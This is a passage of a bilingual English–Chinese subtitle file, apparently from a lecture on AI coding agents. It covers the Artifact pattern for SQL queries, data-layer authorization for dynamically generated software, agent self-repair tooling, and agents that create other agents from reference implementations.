    "zh": "第一种方法看起来更“智能”，但实际上效率极低——对大型表进行查询可能会返回数千行数据。"
  },
  {
    "id": 745,
    "start": 7046.408,
    "end": 7056.171,
    "en": "Having the LLM read all that and describe it in prose burns tokens and time, and worse, LLMs are notoriously error-prone when \"transcribing\" data.",
    "zh": "让 LLM 读取所有这些数据并用散文形式描述会消耗大量 token 和时间，更糟糕的是，LLM 在“转录”数据时以错误频出著称。"
  },
  {
    "id": 746,
    "start": 7056.171,
    "end": 7059.271,
    "en": "A better approach is the Artifact pattern.",
    "zh": "更好的方法是使用 Artifact 模式。"
  },
  {
    "id": 747,
    "start": 7059.271,
    "end": 7071.796,
    "en": "Figure 5-9 shows the workflow of an SQL query Agent: rather than reading the data itself, the Agent generates an SQL query and passes it to the system as a standalone executable artifact.",
    "zh": "图 5-9 展示了 SQL 查询 Agent 的工作流程：Agent 不会自行读取数据，而是生成 SQL 查询，并将其作为独立可执行的产物传递给系统。"
  },
  {
    "id": 748,
    "start": 7071.796,
    "end": 7077.671,
    "en": "The system executes the query against the database and renders the results in a table for the user.",
    "zh": "系统根据数据库执行查询，并将结果以表格形式呈现给用户。"
  },
  {
    "id": 749,
    "start": 7077.671,
    "end": 7088.371,
    "en": "The data therefore flows directly from the database to the interface without passing through the LLM; the LLM writes the query but never has to read and restate thousands of rows.",
    "zh": "因此数据直接从数据库流向界面，而不会经过 LLM；LLM 编写查询，但无需读取和重新表述数千行数据。"
  },
  {
    "id": 750,
    "start": 7088.371,
    "end": 7091.771,
    "en": "This approach is both faster and more accurate.",
    "zh": "这种方法既更快也更准确。"
  },
  {
    "id": 751,
    "start": 7091.771,
    "end": 7096.983,
    "en": "Generated SQL and visualization code must not be executed directly.",
    "zh": "生成的SQL和可视化代码不得直接执行。"
  },
  {
    "id": 752,
    "start": 7096.983,
    "end": 7108.546,
    "en": "The execution layer should use read-only database credentials, parse the SQL, allow only approved SELECT statements, and reject DDL, DML, and multi-statement queries.",
    "zh": "执行层应使用只读数据库凭据，解析SQL，仅允许批准的SELECT语句，并拒绝DDL、DML和多语句查询。"
  },
  {
    "id": 753,
    "start": 7108.546,
    "end": 7118.483,
    "en": "User-provided values should be bound as server-side parameters, with limits on query time, returned rows, accessible tables, and date ranges.",
    "zh": "用户提供的值应作为服务器端参数绑定，限制查询时间、返回行数、可访问的表和日期范围。"
  },
  {
    "id": 754,
    "start": 7118.483,
    "end": 7126.671,
    "en": "Visualization code should run in a sandbox isolated from the network and filesystem and should produce only an approved result format.",
    "zh": "可视化代码应在与网络和文件系统隔离的沙盒中运行，并且只能生成经过批准的结果格式。"
  },
  {
    "id": 755,
    "start": 7126.671,
    "end": 7133.896,
    "en": "The Artifact pattern shortens the data path; it does not replace authorization checks or execution isolation.",
    "zh": "Artifact模式缩短了数据路径；它不替代授权检查或执行隔离。"
  },
  {
    "id": 756,
    "start": 7133.896,
    "end": 7139.221,
    "en": "As illustrated in Figure 5-9: SQL Query Agent Workflow.",
    "zh": "如图5-9所示：SQL查询代理工作流程。"
  },
  {
    "id": 757,
    "start": 7139.221,
    "end": 7148.583,
    "en": "Going further, the Agent can generate two artifacts that form a pipeline: an SQL query and visualization code, such as code for a bar chart.",
    "zh": "进一步而言，代理可以生成两个形成流水线的工件：一个SQL查询和可视化代码，例如条形图代码。"
  },
  {
    "id": 758,
    "start": 7148.583,
    "end": 7153.596,
    "en": "The frontend passes the SQL results directly to the visualization code.",
    "zh": "前端将SQL结果直接传递给可视化代码。"
  },
  {
    "id": 759,
    "start": 7153.596,
    "end": 7161.596,
    "en": "The LLM generates the code but does not participate in the data path—this is the essence of code generation as an interface.",
    "zh": "LLM生成代码，但不参与数据路径——这就是代码生成作为接口的本质。"
  },
  {
    "id": 760,
    "start": 7161.596,
    "end": 7169.408,
    "en": "Experiment 5-13 intermediate difficulty, two stars: : Natural Language Interaction ERP Agent",
    "zh": "实验5-13 中等难度，两颗星：自然语言交互ERP代理"
  },
  {
    "id": 761,
    "start": 7169.408,
    "end": 7180.721,
    "en": "ERP (Enterprise Resource Planning) software is a critical system for businesses, typically using a GUI interface where complex operations require multiple mouse clicks.",
    "zh": "ERP（企业资源计划）软件是企业的关键系统，通常使用GUI界面，复杂的操作需要多次鼠标点击。"
  },
  {
    "id": 762,
    "start": 7180.721,
    "end": 7188.858,
    "en": "An AI Agent can translate users' natural-language requests into SQL queries, enabling automated database access.",
    "zh": "AI Agent可以将用户的自然语言请求转换为SQL查询，实现自动数据库访问。"
  },
  {
    "id": 763,
    "start": 7188.858,
    "end": 7210.258,
    "en": "Requirements: Set up a PostgreSQL database containing two tables: (1) Employee table, including employee ID, name, department, level, hire date, resignation date (NULL means currently employed); (2) Salary table, including employee ID, pay date, salary (one record per month).",
    "zh": "要求：设置包含两个表的PostgreSQL数据库：(1) 员工表，包括员工ID、姓名、部门、级别、入职日期、离职日期（NULL表示仍在职）；(2) 工资表，包括员工ID、发薪日期、工资（每月一条记录）。"
  },
  {
    "id": 764,
    "start": 7210.258,
    "end": 7213.058,
    "en": "The Agent automatically answers:",
    "zh": "代理自动回答："
  },
  {
    "id": 765,
    "start": 7213.058,
    "end": 7215.796,
    "en": "What is the average employee tenure?",
    "zh": "员工的平均在职时间是多少？"
  },
  {
    "id": 766,
    "start": 7215.796,
    "end": 7219.133,
    "en": "How many active employees are in each department?",
    "zh": "每个部门有多少活跃员工？"
  },
  {
    "id": 767,
    "start": 7219.133,
    "end": 7222.746,
    "en": "Which department has the highest average employee level?",
    "zh": "哪个部门的平均员工级别最高？"
  },
  {
    "id": 768,
    "start": 7222.746,
    "end": 7226.983,
    "en": "How many new employees joined each department this year and last year?",
    "zh": "今年和去年每个部门分别有多少新员工加入？"
  },
  {
    "id": 769,
    "start": 7226.983,
    "end": 7232.708,
    "en": "What was the average salary for department A from March of the year before last to May of last year?",
    "zh": "部门A从前年3月到去年5月的平均工资是多少？"
  },
  {
    "id": 770,
    "start": 7232.708,
    "end": 7237.483,
    "en": "Which department had a higher average salary last year, A or B?",
    "zh": "去年哪个部门的平均工资更高，A还是B？"
  },
  {
    "id": 771,
    "start": 7237.483,
    "end": 7241.683,
    "en": "What is the average salary for employees at each level this year?",
    "zh": "今年各等级员工的平均工资是多少？"
  },
  {
    "id": 772,
    "start": 7241.683,
    "end": 7249.808,
    "en": "What is the average salary in the last month for employees with tenure of less than one year, one to two years, and two to three years?",
    "zh": "在职时间不足一年、一至两年和二至三年的员工上个月的平均工资是多少？"
  },
  {
    "id": 773,
    "start": 7249.808,
    "end": 7254.771,
    "en": "Which 10 employees had the largest salary increase from last year to this year?",
    "zh": "哪10名员工的薪资从去年到今年增长最多？"
  },
  {
    "id": 774,
    "start": 7254.771,
    "end": 7262.408,
    "en": "Are there any cases of unpaid wages (employees who were employed during a given month but have no salary record for that month)?",
    "zh": "有没有未支付工资的情况（某个月份被雇佣但该月份没有薪资记录的员工）？"
  },
  {
    "id": 775,
    "start": 7262.408,
    "end": 7265.258,
    "en": "Dynamically Generating Software.",
    "zh": "动态生成软件"
  },
  {
    "id": 776,
    "start": 7265.428,
    "end": 7272.79,
    "en": "The ultimate application of code generation is letting the Agent create software entirely dynamically, from scratch.",
    "zh": "代码生成的最终应用是让智能体从零开始完全动态地创建软件。"
  },
  {
    "id": 777,
    "start": 7272.74,
    "end": 7289.865,
    "en": "Anthropic's \"Imagine with Claude\" marks out the frontier: the user makes a request, Claude generates the frontend interface and interaction logic in real time, the user interacts with the generated software, and Claude modifies the code to produce a new interface showing the results.",
    "zh": "Anthropic的“用Claude进行想象”标志着这一领域的前沿：用户提出请求，Claude实时生成前端界面和交互逻辑，用户与生成的软件互动，Claude修改代码以生成显示结果的新界面。"
  },
  {
    "id": 778,
    "start": 7289.865,
    "end": 7294.703,
    "en": "The user watches an application come into being from nothing and keep evolving.",
    "zh": "用户看着应用程序从无到有并持续进化。"
  },
  {
    "id": 779,
    "start": 7294.852,
    "end": 7303.527,
    "en": "Fully dynamic generation, however, is costly and slow—better suited to demonstrations of what is possible than to production use.",
    "zh": "然而，完全动态的生成成本高昂且缓慢——更适合展示可能性，而不是用于生产环境。"
  },
  {
    "id": 780,
    "start": 7303.477,
    "end": 7307.952,
    "en": "A more pragmatic approach is to customize an existing framework.",
    "zh": "更实际的方法是定制一个现有的框架。"
  },
  {
    "id": 781,
    "start": 7307.952,
    "end": 7315.477,
    "en": "This \"semi-custom\" model preserves the stability of the base software while exposing selected aspects to user control.",
    "zh": "这种「半定制」模型在保持基础软件稳定性的同时，将部分功能暴露给用户控制。"
  },
  {
    "id": 782,
    "start": 7315.477,
    "end": 7335.589,
    "en": "The user can say \"make the button blue,\" \"add a shortcut menu to the sidebar,\" or \"switch to a more readable font\"; the Agent updates the frontend code, and HMR (Hot Module Replacement—which updates affected modules without a full-page reload and usually preserves application state) applies the changes immediately.",
    "zh": "用户可以说「把按钮变成蓝色」、「在侧边栏添加快捷菜单」或「切换到更易读的字体」；智能体会更新前端代码，HMR（热模块替换——它会在不刷新整个页面的情况下更新受影响的模块，并通常保留应用状态）会立即应用这些更改。"
  },
  {
    "id": 783,
    "start": 7335.589,
    "end": 7340.402,
    "en": "A one-size-fits-all product becomes an experience tailored to each user.",
    "zh": "一种通用产品变成了针对每个用户的个性化体验。"
  },
  {
    "id": 784,
    "start": 7340.402,
    "end": 7348.164,
    "en": "Experiment 5-14 intermediate difficulty, two stars: : Conversational Interface Customization System",
    "zh": "实验5-14 中等难度，两颗星：对话式界面定制系统"
  },
  {
    "id": 785,
    "start": 7348.164,
    "end": 7361.489,
    "en": "Experiment Goal: Enable users to customize the software interface instantly through natural-language dialogue, and evaluate whether code generation with hot reload can effectively provide personalized user experiences.",
    "zh": "实验目标：通过自然语言对话使用户能够即时定制软件界面，并评估通过热重载生成代码是否能有效提供个性化的用户体验。"
  },
  {
    "id": 786,
    "start": 7361.489,
    "end": 7375.127,
    "en": "Technical Approach: Build a basic chatbot application (React frontend and FastAPI backend), and run both components in development mode with hot reload enabled (React HMR and FastAPI reload).",
    "zh": "技术方法：构建一个基本的聊天机器人应用程序（React 前端和 FastAPI 后端），并在开发模式下运行两个组件，并启用热重载（React HMR 和 FastAPI 重载）。"
  },
  {
    "id": 787,
    "start": 7375.127,
    "end": 7384.727,
    "en": "Users propose UI customization requirements (colors, fonts, layout, component positions, etc.) during the conversation.",
    "zh": "用户在对话过程中提出界面定制需求（颜色、字体、布局、组件位置等）。"
  },
  {
    "id": 788,
    "start": 7384.727,
    "end": 7388.127,
    "en": "The Agent autonomously modifies the code.",
    "zh": "智能体自主修改代码。"
  },
  {
    "id": 789,
    "start": 7388.127,
    "end": 7397.989,
    "en": "The hot-reload mechanism automatically detects file changes, the frontend recompiles and refreshes, and the user sees the interface changes in real time.",
    "zh": "热重载机制会自动检测文件变化，前端重新编译并刷新，用户可以实时看到界面变化。"
  },
  {
    "id": 790,
    "start": 7397.989,
    "end": 7402.289,
    "en": "The system supports multiple rounds of iterative customization.",
    "zh": "该系统支持多轮迭代式定制。"
  },
  {
    "id": 791,
    "start": 7402.289,
    "end": 7407.664,
    "en": "Dynamic software changes the traditional security premise along with its flexibility.",
    "zh": "动态软件在提升灵活性的同时，也改变了传统的安全前提。"
  },
  {
    "id": 792,
    "start": 7407.664,
    "end": 7417.064,
    "en": "In the past, application business code was developed, reviewed, tested, and deployed, then remained relatively stable for a period of time.",
    "zh": "过去，应用业务代码被开发、审查、测试和部署，之后会相对稳定一段时间。"
  },
  {
    "id": 793,
    "start": 7417.064,
    "end": 7428.727,
    "en": "Authorization checks therefore usually lived in the application layer: business code first decided whether the current user could read or modify a record, and only then sent the operation to the database.",
    "zh": "因此，授权检查通常存在于应用层：业务代码首先决定当前用户是否可以读取或修改某条记录，然后才将操作发送到数据库。"
  },
  {
    "id": 794,
    "start": 7428.727,
    "end": 7438.314,
    "en": "When interfaces, workflows, and even data-access code can be generated or rewritten by an Agent at any time, that layer is no longer stable.",
    "zh": "当界面、工作流程甚至数据访问代码可以随时由智能体生成或重写时，这一层就不再稳定了。"
  },
  {
    "id": 795,
    "start": 7438.314,
    "end": 7448.264,
    "en": "Newly generated code may omit a subtle authorization check, expose a field that was previously hidden, or bypass an existing check through another call path.",
    "zh": "新生成的代码可能会遗漏一个微妙的授权检查，暴露之前隐藏的字段，或者通过另一条调用路径绕过现有的检查。"
  },
  {
    "id": 796,
    "start": 7448.264,
    "end": 7460.252,
    "en": "Whether the cause is an ordinary generation error or dangerous code produced after prompt injection, the result is the same: the permission boundary that business code was supposed to maintain may be silently broken.",
    "zh": "无论是普通的生成错误还是经过提示注入后产生的危险代码，结果都是一样的：本应由业务代码维护的权限边界可能会被悄然破坏。"
  },
  {
    "id": 797,
    "start": 7460.252,
    "end": 7468.027,
    "en": "The security goal for dynamic software therefore cannot be to “make sure the AI writes every authorization check correctly.",
    "zh": "因此，动态软件的安全目标不能是“确保AI正确编写每一条授权检查”。"
  },
  {
    "id": 798,
    "start": 7468.027,
    "end": 7474.589,
    "en": "It should be that permission constraints remain impossible to bypass even when the AI writes incorrect code.",
    "zh": "而是应该让权限约束即使在AI编写了错误代码时也难以被绕过。"
  },
  {
    "id": 799,
    "start": 7474.589,
    "end": 7483.527,
    "en": "If authorization checks live inside the dynamically generated business logic, they share the same trust domain as the code they are meant to constrain.",
    "zh": "如果授权检查存在于动态生成的业务逻辑中，它们就会与所要约束的代码处于同一个信任域中。"
  },
  {
    "id": 800,
    "start": 7483.527,
    "end": 7495.164,
    "en": "Prompts, tests, and code review reduce the error rate, but they cannot exhaustively cover every execution path introduced by future generations and cannot serve as the final security boundary.",
    "zh": "提示、测试和代码审查可以降低错误率，但无法全面覆盖未来生成的所有执行路径，也无法作为最终的安全边界。"
  },
  {
    "id": 801,
    "start": 7495.164,
    "end": 7500.164,
    "en": "A more robust architecture moves the trust boundary down to the data layer.",
    "zh": "更稳健的架构会将信任边界下移到数据层。"
  },
  {
    "id": 802,
    "start": 7500.164,
    "end": 7512.727,
    "en": "Dynamically generated application code can handle presentation, workflows, and business orchestration, while a stable, human-reviewed mechanism enforces the rules that decide who may do what to which data.",
    "zh": "动态生成的应用代码可以处理表示、工作流和业务编排，而稳定的、经过人工审查的机制则负责执行决定谁可以对哪些数据执行什么操作的规则。"
  },
  {
    "id": 803,
    "start": 7512.727,
    "end": 7526.839,
    "en": "Database row-level security can restrict users to records in their own tenant; constraints and validators can reject illegal states; controlled views, stored procedures, or data-access services can expose only approved operations.",
    "zh": "数据库的行级安全可以限制用户只能访问其所属租户的记录；约束和验证器可以拒绝非法状态；受控视图、存储过程或数据访问服务可以只暴露经过批准的操作。"
  },
  {
    "id": 804,
    "start": 7526.839,
    "end": 7536.027,
    "en": "Every read and write should also carry an access context bound by a trusted runtime, containing the user, tenant, role, or Agent identity.",
    "zh": "每次读写操作还应携带一个由可信运行时绑定的访问上下文，包含用户、租户、角色或智能体身份。"
  },
  {
    "id": 805,
    "start": 7536.027,
    "end": 7545.014,
    "en": "Generated code receives only this scoped identity: it cannot forge the identity or obtain a privileged database credential that bypasses the rules.",
    "zh": "生成的代码仅能获得这个作用域内的身份：它不能伪造身份，也不能获取绕过规则的特权数据库凭证。"
  },
  {
    "id": 806,
    "start": 7545.014,
    "end": 7551.727,
    "en": "Even if it omits its own authorization check, the data layer still rejects the unauthorized operation.",
    "zh": "即使它省略了自己的授权检查，数据层仍会拒绝未经授权的操作。"
  },
  {
    "id": 807,
    "start": 7551.892,
    "end": 7557.342,
    "en": "Moving authorization downward does not mean putting all business logic in the database.",
    "zh": "将授权下移并不意味着将所有业务逻辑放在数据库中。"
  },
  {
    "id": 808,
    "start": 7557.292,
    "end": 7565.429,
    "en": "The application layer may still perform pre-checks to provide fast feedback, but the data layer must retain final decision authority.",
    "zh": "应用层仍可以执行预检查以提供快速反馈，但数据层必须保留最终决策权。"
  },
  {
    "id": 809,
    "start": 7565.429,
    "end": 7570.517,
    "en": "The same rule can improve the experience above and provide a guarantee below.",
    "zh": "同样的规则可以在上方提升体验，在下方提供保障。"
  },
  {
    "id": 810,
    "start": 7570.517,
    "end": 7579.829,
    "en": "That guarantee also requires every data-access path to pass through the trusted data layer; generated code must not be able to connect directly around it.",
    "zh": "这种保障还要求每条数据访问路径都必须经过可信的数据层；生成的代码不能直接绕过它。"
  },
  {
    "id": 811,
    "start": 7579.829,
    "end": 7589.079,
    "en": "The result is an application whose upper layer can keep changing while its non-negotiable permission constraints remain in a layer that is not rewritten on every generation.",
    "zh": "结果是一个上层可以不断变化的应用程序，而其不可协商的权限约束则保持在一个不会在每次生成时被重写的层中。"
  },
  {
    "id": 812,
    "start": 7589.079,
    "end": 7595.879,
    "en": "This is the data layer of Chapter 1's three-layer guardrail framework—the one that is hardest to bypass.",
    "zh": "这是第1章三层防护框架的数据层——最难绕过的一层。"
  },
  {
    "id": 813,
    "start": 7595.879,
    "end": 7603.892,
    "en": "Experiment 5-15 advanced difficulty, three stars: : Permission-Embedded Data Objects for Dynamic Software",
    "zh": "实验5-15 高难度，三颗星：用于动态软件的权限嵌入数据对象"
  },
  {
    "id": 814,
    "start": 7603.892,
    "end": 7614.604,
    "en": "Experiment Goal: Build an object store that allows application code to be generated or rewritten dynamically while still enforcing authorization and data integrity at the data layer.",
    "zh": "实验目标：构建一个对象存储，允许应用程序代码动态生成或重写，同时在数据层仍能强制执行授权和数据完整性。"
  },
  {
    "id": 815,
    "start": 7614.604,
    "end": 7624.529,
    "en": "Verify that generated code cannot cross the stable data boundary by skipping a state-machine transition, writing an out-of-range value, or reading across tenants.",
    "zh": "验证生成的代码不能通过跳过状态机转换、写入范围外的值或跨租户读取来跨越稳定的数据边界。"
  },
  {
    "id": 816,
    "start": 7624.529,
    "end": 7630.529,
    "en": "Technical Approach: Provide a Python object-store middleware layer over PostgreSQL.",
    "zh": "技术方法：在PostgreSQL之上提供一个Python对象存储中间层。"
  },
  {
    "id": 817,
    "start": 7630.529,
    "end": 7646.942,
    "en": "Data types declare their permission rules, access context, validators, object relationships, and reactions; every object read or write passes in turn through the permission and validation pipeline, persistence, referential-integrity checks, and so on.",
    "zh": "数据类型声明其权限规则、访问上下文、验证器、对象关系和反应；每个读取或写入的对象依次经过权限和验证管道、持久化、参照完整性检查等。"
  },
  {
    "id": 818,
    "start": 7646.942,
    "end": 7660.079,
    "en": "Acceptance Criteria: A valid hiring-pipeline update succeeds; skipping a candidate state transition, writing a salary outside the position range, and reading across tenants are all rejected by the data layer.",
    "zh": "验收标准：有效的招聘流程更新成功；跳过候选人状态转换、写入职位范围外的薪资以及跨租户读取均被数据层拒绝。"
  },
  {
    "id": 819,
    "start": 7660.079,
    "end": 7663.517,
    "en": "Code Creating Code: Agent Bootstrapping.",
    "zh": "代码创造代码：智能体自举。"
  },
  {
    "id": 820,
    "start": 7663.517,
    "end": 7672.892,
    "en": "The previous sections have followed code generation across one domain after another—from mathematical reasoning to document creation to interface customization.",
    "zh": "前几节已经展示了代码生成在各个领域中的应用——从数学推理到文档创建再到界面定制。"
  },
  {
    "id": 821,
    "start": 7672.892,
    "end": 7680.792,
    "en": "Push these capabilities to their limit and a natural question arises: can an Agent use code generation to create another Agent?",
    "zh": "将这些能力推向极限，一个自然的问题就会浮现：智能体能否使用代码生成来创建另一个智能体？"
  },
  {
    "id": 822,
    "start": 7680.792,
    "end": 7685.629,
    "en": "As illustrated in Figure 5-10: Agent Bootstrapping Loop.",
    "zh": "如图5-10所示：智能体自举循环。"
  },
  {
    "id": 823,
    "start": 7685.629,
    "end": 7688.992,
    "en": "Agent Self-Repair: OpenClaw Doctor.",
    "zh": "智能体自我修复：OpenClaw医生。"
  },
  {
    "id": 824,
    "start": 7688.992,
    "end": 7694.117,
    "en": "A crucial prerequisite for Agent bootstrapping is the ability to self-repair.",
    "zh": "智能体自举的一个关键前提是自我修复的能力。"
  },
  {
    "id": 825,
    "start": 7694.117,
    "end": 7701.104,
    "en": "The doctor command in OpenClaw embodies this capability—it can automatically detect three types of issues:",
    "zh": "OpenClaw中的doctor命令体现了这种能力——它能够自动检测三种类型的问题："
  },
  {
    "id": 826,
    "start": 7701.104,
    "end": 7708.654,
    "en": "Configuration anomalies: Expired OAuth tokens, legacy configuration formats, port conflicts",
    "zh": "配置异常：过期的OAuth令牌、旧版配置格式、端口冲突"
  },
  {
    "id": 827,
    "start": 7708.654,
    "end": 7714.167,
    "en": "State issues: Stale session lock files, missing plugin dependencies",
    "zh": "状态问题：过时的会话锁文件、缺失的插件依赖"
  },
  {
    "id": 828,
    "start": 7714.167,
    "end": 7719.392,
    "en": "Service health issues: Gateway not running, missing sandbox images",
    "zh": "服务健康问题：网关未运行、缺少沙箱镜像"
  },
  {
    "id": 829,
    "start": 7719.392,
    "end": 7736.392,
    "en": "It then automatically resolves them through a layered repair strategy: safe fixes (configuration normalization, lock file cleanup) are executed automatically; risky operations (service restarts, forced configuration overwrites) require user confirmation.",
    "zh": "然后通过分层修复策略自动解决它们：安全修复（配置标准化、锁文件清理）会自动执行；高风险操作（服务重启、强制配置覆盖）需要用户确认。"
  },
  {
    "id": 830,
    "start": 7736.392,
    "end": 7752.454,
    "en": "Let's not overstate this: high-frequency problems such as expired tokens, stale lock files, and port conflicts have clear detection rules and fixed repair actions, and doctor addresses them first with deterministic checks, much like a traditional operations script.",
    "zh": "我们不要夸大这一点：像过期令牌、过时锁文件和端口冲突这样的高频问题有明确的检测规则和固定的修复动作，医生首先通过确定性检查来处理它们，就像传统的运维脚本一样。"
  },
  {
    "id": 831,
    "start": 7752.454,
    "end": 7767.379,
    "en": "Agent capability becomes meaningful in the second layer: for harder problems beyond those rules, doctor uses an LLM to analyze error logs, interpret configuration files, infer root causes, and produce a targeted repair plan.",
    "zh": "智能体能力在第二层变得有意义：对于超出这些规则的更难问题，医生使用LLM分析错误日志、解释配置文件、推断根本原因并生成针对性的修复计划。"
  },
  {
    "id": 832,
    "start": 7767.379,
    "end": 7780.104,
    "en": "Deterministic checks resolve common problems reliably, while the LLM covers the long tail; together, the two layers allow doctor --fix to resolve a substantial share of common gateway issues automatically.",
    "zh": "确定性检查可以可靠地解决常见问题，而LLM则覆盖长尾问题；这两层结合使doctor --fix能够自动解决大量常见的网关问题。"
  },
  {
    "id": 833,
    "start": 7780.104,
    "end": 7792.704,
    "en": "What makes this an \"Agent repairing Agent\" pattern is that the Agent works not on an external system but on its own runtime environment, elevating self-repair from a system-adapter function to core bootstrapping infrastructure.",
    "zh": "这之所以成为“智能体修复智能体”的模式，是因为智能体不是在外部系统上工作，而是在其自身的运行时环境中工作，将自我修复从系统适配功能提升为核心启动基础设施。"
  },
  {
    "id": 834,
    "start": 7792.704,
    "end": 7796.154,
    "en": "Key Techniques for Making an Agent Write an Agent.",
    "zh": "让智能体编写智能体的关键技术。"
  },
  {
    "id": 835,
    "start": 7796.308,
    "end": 7808.208,
    "en": "Creating a high-quality Agent is far harder than generating ordinary application code, because it demands a deep understanding of Agent architecture patterns, best practices, and common pitfalls.",
    "zh": "创建一个高质量的智能体比生成普通应用程序代码要困难得多，因为它需要对智能体架构模式、最佳实践和常见陷阱有深入的理解。"
  },
  {
    "id": 836,
    "start": 7808.158,
    "end": 7816.383,
    "en": "Without that domain expertise, even the most powerful code generation models may produce Agents with serious architectural flaws.",
    "zh": "缺乏这种领域专业知识，即使是最强大的代码生成模型也可能生成具有严重架构缺陷的智能体。"
  },
  {
    "id": 837,
    "start": 7816.383,
    "end": 7818.72,
    "en": "Common flaws include:",
    "zh": "常见缺陷包括："
  },
  {
    "id": 838,
    "start": 7818.72,
    "end": 7835.42,
    "en": "Ad hoc context management: Failing to use the standard context format discussed in Chapter 2, stuffing trajectories as plain text into the context, ignoring KV Cache optimizations from structured messages, and introducing boundary-condition bugs in tool-call loops",
    "zh": "临时上下文管理：未能使用第2章讨论的标准上下文格式，将轨迹作为纯文本放入上下文，忽略结构化消息中的KV缓存优化，并在工具调用循环中引入边界条件错误"
  },
  {
    "id": 839,
    "start": 7835.42,
    "end": 7844.92,
    "en": "Non-standard tool design: Vague descriptions, missing usage boundary instructions and negative lists, and parameters lacking concrete examples",
    "zh": "非标准工具设计：描述模糊、缺少使用边界说明和负面列表，参数缺乏具体示例"
  },
  {
    "id": 840,
    "start": 7844.92,
    "end": 7852.545,
    "en": "Outdated technology choices: A tendency to use the most common but outdated models and APIs from training data.",
    "zh": "过时的技术选择：倾向于使用训练数据中最常见但过时的模型和API。"
  },
  {
    "id": 841,
    "start": 7852.545,
    "end": 7858.433,
    "en": "Solution: Maintain a SOTA knowledge base or equip the Agent with search capabilities",
    "zh": "解决方案：维护一个最先进的知识库，或为智能体配备搜索能力"
  },
  {
    "id": 842,
    "start": 7858.433,
    "end": 7866.62,
    "en": "Disconnection from the external ecosystem: Using deprecated APIs, unmaintained libraries, or flawed patterns",
    "zh": "与外部生态系统的断开：使用过时的API、未维护的库或有缺陷的模式"
  },
  {
    "id": 843,
    "start": 7866.62,
    "end": 7881.183,
    "en": "The most effective path to solving these problems is not to exhaustively list all rules in the prompt, but to provide high-quality Agent implementations as reference examples, guiding the code generation Agent to modify them rather than starting from scratch.",
    "zh": "解决这些问题最有效的方法不是详尽地列出提示中的所有规则，而是提供高质量的智能体实现作为参考示例，引导代码生成智能体对其进行修改，而不是从零开始。"
  },
  {
    "id": 844,
    "start": 7881.183,
    "end": 7887.983,
    "en": "The advantage of example-based generation is plain: the example code itself carries the best practices.",
    "zh": "基于示例生成的优势显而易见：示例代码本身包含了最佳实践。"
  },
  {
    "id": 845,
    "start": 7887.983,
    "end": 7900.933,
    "en": "An Agent that adapts a validated implementation gets things right more often than one that starts from scratch, because the implementation preserves sound architectural choices without requiring every rule to be spelled out in the prompt.",
    "zh": "适应已验证实现的智能体比从零开始的智能体更常取得成功，因为该实现保留了健全的架构选择，而无需在提示中逐条说明每一条规则。"
  },
  {
    "id": 846,
    "start": 7900.933,
    "end": 7921.458,
    "en": "When an Agent receives a task to develop a new Agent, it should first copy its own code (or other validated, high-quality implementations) and then make targeted modifications: adjust the system prompt to match the new role, replace or add tools to suit new functions, modify business logic while preserving the architectural framework.",
    "zh": "当智能体接收到开发新智能体的任务时，它应首先复制自己的代码（或其他经过验证的高质量实现），然后进行有针对性的修改：调整系统提示以匹配新角色，替换或添加工具以满足新功能，修改业务逻辑同时保留架构框架。"
  },
  {
    "id": 847,
    "start": 7921.458,
    "end": 7934.958,
    "en": "This \"self-replication with adaptive modification\" pattern ensures the new Agent inherits core technical advantages while allowing differentiation in specific dimensions—much like gene replication with mutation in biology.",
    "zh": "这种“自我复制并进行适应性修改”的模式确保新智能体继承核心技术优势，同时允许在特定维度上有所差异——就像生物学中的基因复制与突变一样。"
  },
  {
    "id": 848,
    "start": 7934.958,
    "end": 7942.095,
    "en": "Experiment 5-16 advanced difficulty, three stars: : Develop an Agent That Can Create Agents",
    "zh": "实验5-16 高难度，三颗星：开发一个能够创建智能体的智能体"
  },
  {
    "id": 849,
    "start": 7942.095,
    "end": 7957.033,
    "en": "Experiment Goal: Build a Coding Agent with metaprogramming capabilities—the ability to write programs that generate or modify other programs—so that it can automatically create new Agent systems from user requirements while adhering to best practices.",
    "zh": "实验目标：构建一个具有元编程能力的代码智能体——即编写能够生成或修改其他程序的程序的能力——使其能够根据用户需求自动创建新的智能体系统，同时遵循最佳实践。"
  },
  {
    "id": 850,
    "start": 7957.033,
    "end": 7967.62,
    "en": "Technical Approach: Provide the Coding Agent with high-quality Agent implementations as reference examples (the ch5/coding-agent project itself can be used).",
    "zh": "技术方法：为代码智能体提供高质量的智能体实现作为参考示例（第5章的代码智能体项目本身可以被使用）。"
  },
  {
    "id": 851,
    "start": 7967.62,
    "end": 7976.82,
    "en": "When tasked with creating a new Agent, the Agent first copies this example code and then makes targeted modifications based on the user's specific needs.",
    "zh": "当被要求创建新智能体时，智能体会首先复制此示例代码，然后根据用户的特定需求进行有针对性的修改。"
  },
  {
    "id": 852,
    "start": 7976.82,
    "end": 7983.12,
    "en": "Acceptance Criteria: The generated Agent runs successfully and completes basic tasks.",
    "zh": "验收标准：生成的智能体能够成功运行并完成基本任务。"
  },
  {
    "id": 853,
    "start": 7983.12,
    "end": 7994.933,
    "en": "Verify that it uses standard message formats and tool-call protocols, currently recommended models and APIs, and correct context and state management across multiple conversation turns.",
    "zh": "验证其是否使用标准消息格式和工具调用协议，目前推荐的模型和API，以及在多轮对话中正确的上下文和状态管理。"
  },
  {
    "id": 854,
    "start": 7994.933,
    "end": 8002.545,
    "en": "Compare generation from scratch with example-based modification, and confirm that the latter improves quality and efficiency.",
    "zh": "比较从零生成与基于示例的修改，确认后者提高了质量和效率。"
  },
  {
    "id": 855,
    "start": 8002.545,
    "end": 8008.433,
    "en": "As illustrated in Figure 5-11: Pipeline of an Agent That Can Create Agents.",
    "zh": "如图5-11所示：能够创建智能体的智能体的流程。"
  },
  {
    "id": 856,
    "start": 8008.433,
    "end": 8010.32,
    "en": "Chapter Summary.",
    "zh": "章节总结。"
  },
  {
    "id": 857,
    "start": 8010.32,
    "end": 8020.408,
    "en": "This chapter has argued one thing throughout: code is not merely a tool for writing programs—it is the language of an Agent's formalized thinking and precise expression.",
    "zh": "本章始终强调一个观点：代码不仅仅是编写程序的工具，它是智能体形式化思维和精确表达的语言。"
  },
  {
    "id": 858,
    "start": 8020.564,
    "end": 8038.801,
    "en": "The Harness engineering section reached one central conclusion: Coding Agents are mature not because code generation models are exceptionally strong, but because decades of accumulated software engineering infrastructure—test suites, type systems, version control—naturally form a powerful Harness.",
    "zh": "Harness工程部分得出一个核心结论：编码智能体之所以成熟，并不是因为代码生成模型特别强大，而是因为数十年积累的软件工程基础设施——测试套件、类型系统、版本控制——自然形成了一个强大的Harness。"
  },
  {
    "id": 859,
